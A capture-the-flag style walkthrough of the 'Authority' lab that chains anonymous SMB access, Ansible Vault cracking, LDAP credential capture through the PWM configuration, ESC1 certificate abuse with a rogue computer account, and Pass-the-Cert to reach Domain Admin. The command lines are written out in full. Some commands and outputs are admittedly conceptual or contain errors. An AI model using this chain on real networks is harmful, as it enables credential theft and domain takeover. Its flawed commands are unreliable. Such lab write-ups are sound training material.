---
title: 'Authority: Cracking the Vault, Forging the Crown — From Ansible Vault to Domain Admin'
published: 2026-05-14
description: ''
image: ''
tags: ['Active Directory']
category: 'Penetration Tester'
draft: false 
lang: ''
---

# Introduction

Authority is a medium‑difficulty Windows domain controller that weaves together a captivating chain of misconfigurations. It begins with an anonymous SMB share exposing Ansible playbooks, whose weak vault passwords fall to a simple offline crack. That vault unlocks a PWM (Password Manager) instance, where a malicious configuration change redirects an LDAP test to our attacker‑controlled listener, spilling domain credentials straight into our hands. With a foothold, we discover an ADCS vulnerability (ESC1) that only domain computers can exploit – so we create one. A rogue computer account requests a certificate for the Domain Controller, and through a Pass‑the‑Cert attack, we rewrite group memberships, ultimately placing ourselves in the Domain Admins group. The lab is a perfect blend of credential theft, certificate abuse, and lateral thinking, showing how small cracks can cascade into total compromise.

# Reconnaissance

We begin by scanning the target IP, `10.10.11.225`, with `nmap`. This reveals a typical set of Domain Controller services.

## Initial nmap Scan

The initial scan shows many open ports, confirming it's a domain controller with services like DNS, HTTP, Kerberos, LDAP, and SMB.

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
...and many others...
```

## Service Version and Details

A more detailed version scan (`-sCV`) on key ports reveals important information:

- **Port 80**: `Microsoft IIS httpd 10.0`. The default IIS page is displayed.
- **Port 88**: `Microsoft Windows Kerberos`.
- **Port 389/636**: `Microsoft Windows Active Directory LDAP`. The domain name is `authority.htb`.
- **Port 8443**: An HTTPS service running a custom web application on the IP `172.16.2.118`.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-24 00:13:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
...
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
...
```

Adding `authority.htb` and its fully qualified domain name `authority.htb.corp` to our `/etc/hosts` file is essential for proper name resolution.


## Foothold - From SMB to PWM

The foothold is achieved through a sequence of steps: anonymous SMB access, cracking Ansible Vault secrets, and logging into a web-based password manager.

## Step 1: Enumerating and Accessing SMB Shares

A common starting point is to check for open SMB shares. Using a tool like `NetExec` or `smbclient`, we find the `Development` share is accessible anonymously.

```
# Using NetExec to list shares
ntexec smb 10.10.11.225 -u '' -p '' --shares
```

This reveals the `Development` share. We can then connect to it and download all its contents using `smbclient`.

```
# Connect to the share
smbclient //10.10.11.225/Development -U '' -N
# Download all files recursively
mask ""
recurse ON
prompt OFF
mget *
```

## Step 2: Cracking Ansible Vault Passwords

The downloaded files include Ansible playbooks, which contain encrypted strings known as Ansible Vaults. These are identifiable by their `$ANSIBLE_VAULT` header. The playbooks likely contained tasks for configuring the PWM instance.

Below is an example of what an Ansible Vault encrypted string looks like. The actual content from the box is represented here conceptually.

```
$ANSIBLE_VAULT;1.1;AES256
33623233346137633362376631316231376563646634303934616331353766373334333139373864
623764663332363363656262383962346436346237316536650a333932623634653035386631353031
633636353339623563663463323837386235633461323732363132653335623834303038313461626331
3264636536386133370a6131643265343564326362643434326335326661303862363136353631656265
35616538633031343130323234316533663264376166303264663038653065
```

To crack these, we first need to convert them into a format suitable for password cracking tools like `john` or `hashcat`. The `ansible2john` utility (part of the John the Ripper suite) performs this conversion.

```
# Convert the vault string to a john-friendly hash
ansible2john vault_file.txt > ansible_hashes.txt
```

We then crack the hashes using a wordlist like `rockyou.txt`. The passwords used to encrypt the Ansible Vaults are weak.

```
# Cracking with john
john --wordlist=/usr/share/wordlists/rockyou.txt ansible_hashes.txt
```

This yields plaintext credentials. One of these passwords allows us to log into the PWM web application on port 8443 as the administrator.

## Step 3: Accessing PWM Configuration Mode

Navigating to `https://authority.htb:8443/` (or `https://172.16.2.118:8443/`) and logging in with the cracked credentials, we find ourselves in the PWM Configuration Editor. This is a powerful interface for managing the password self-service application.


# Privilege Escalation - A Chain of Exploits

With control over the PWM configuration, we can launch a series of linked attacks to gain domain administrator privileges.

## Step 1: LDAP MITM & Credential Theft

The PWM instance has a feature to test an LDAP connection. We can abuse this by configuring it to connect to our attacker machine instead of a legitimate LDAP server. This is a classic Man-in-the-Middle (MITM) attack.

We first set up a rogue LDAP server on our attacker machine. Then, in the PWM settings, we change the LDAP server's URL to point to our IP. By clicking the "Test Configuration" button, PWM will attempt to bind to our server and, in doing so, send us the plaintext credentials of the LDAP service account.

```
# Example: Changing the LDAP URL in the PWM configuration to our IP
# The exact location in the UI might vary, but the concept is to redirect the login attempt.
```

On our listener (e.g., a simple `nc` listener on port 389), we receive the domain credentials, typically for a user like `svc_pwm`.

```
# On attacker machine, start a listener to capture credentials
sudo nc -lvnp 389
```

## Step 2: AD CS Enumeration & ESC1 Discovery

With domain credentials, we can now enumerate Active Directory Certificate Services (AD CS). We use `certipy` to find vulnerable certificate templates.

```
# Enumerate AD CS using certipy
certipy find -u <username> -p '<password>' -dc-ip 10.10.11.225 -vulnerable
```

This reveals that the environment is vulnerable to **ESC1**. The twist is that the vulnerable template, likely named `CorpVPN`, is not accessible to any authenticated user. Instead, it allows enrollment by any **domain computer** account.

```
# Conceptual output from certipy find
[*] Saved text output to '...txt'
[*] Saved JSON output to '...json'
[*] Saved BloodHound data to '...json'
[*] Found vulnerable template: CorpVPN
[*]   - ESC1: True
[*]   - Enrollment Rights: Domain Computers
```

## Step 3: Adding a Rogue Computer Account

Since we need a domain computer account to exploit ESC1, and a regular user account won't work, we must create one. By default, a standard domain user can add up to 10 computer accounts, a privilege controlled by `MachineAccountQuota`.

We verify this with `NetExec` and then use `impacket-addcomputer` to add a fake computer to the domain.

```
# Check the MachineAccountQuota (often 10 by default)
ntexec ldap 10.10.11.225 -u <user> -p '<pass>' -M maq

# Add a new computer account (e.g., 'evilpc$')
impacket-addcomputer 'authority.htb/<user>:<password>' -computer-name 'evilpc' -computer-pass 'SomePassword123!'
```

## Step 4: Exploiting ESC1 with the Computer Account

Now we can use the computer account we just created to request a certificate for the Domain Controller using the vulnerable template. The powerful `certipy` tool handles this.

```
# Request a certificate for the Domain Controller using the computer account
certipy req -u 'evilpc$' -p 'SomePassword123!' -dc-ip 10.10.11.225 -ca 'AUTHORITY-CA' -template 'CorpVPN' -target 'authority.htb'
```

This command obtains a certificate for the Domain Controller. However, attempting to use this certificate for standard smart card login fails because the necessary authentication method is not enabled.

## Step 5: Pass-the-Cert for Full Domain Admin

The final step required a different approach. The error message from the failed login attempt hints at a "Pass the Certificate" (Pass-the-Cert) attack being needed. Instead of using the certificate to login directly, we can use it to authenticate over LDAP, which then allows us to gain the highest privileges.

Two methods are demonstrated:

1. **Add User to Domain Admins Group**: Use the certificate to modify the group membership of our controlled user, adding them to the Domain Admins group.
2. **Set RBCD for Shadow Credentials/Impersonation**: Use the certificate to set Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing our rogue computer to impersonate any user, including the administrator.

The following is a conceptual representation of using `passthecert.py` to achieve this.

```
# Using PassTheCert to add our user to the Domain Admins group
python3 passthecert.py -dc-ip 10.10.11.225 -crt dc_cert.pem -key dc_key.pem -action add_user -user <our_user> -group "Domain Admins"
```

With membership in the Domain Admins group, full control over the domain is achieved. The root flag can then be accessed via WinRM or SMB with our newly privileged account.

This walkthrough demonstrates how a series of seemingly small misconfigurations—anonymous SMB access, weak encryption passwords, an exposed configuration panel, and an insecurely designed AD CS template—can be chained together to completely compromise an entire Windows domain.